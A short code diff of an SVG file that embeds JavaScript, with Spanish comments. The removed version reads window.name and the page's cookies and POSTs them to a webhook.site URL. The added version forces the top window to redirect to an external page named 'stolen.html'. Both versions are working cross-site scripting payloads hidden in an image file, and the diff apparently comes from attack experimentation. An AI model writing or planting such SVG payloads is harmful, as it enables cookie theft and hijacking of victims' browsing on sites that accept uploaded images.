@@ -1,18 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
 <script type="text/javascript">
-  var WEBHOOK = 'https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e';
-  
-  // Leer window.name — cross-origin permitido
-  var name = window.name;
-  
-  fetch(WEBHOOK, {
-    method: 'POST',
-    mode: 'no-cors',
-    body: JSON.stringify({
-      window_name: name,
-      own_cookie: document.cookie,
-      ts: new Date().toISOString()
-    })
-  });
+  // Redirigís toda la página a tu dominio
+  window.top.location = 'https://poggiecar.github.io/CDN/stolen.html';
 </script>
 </svg>
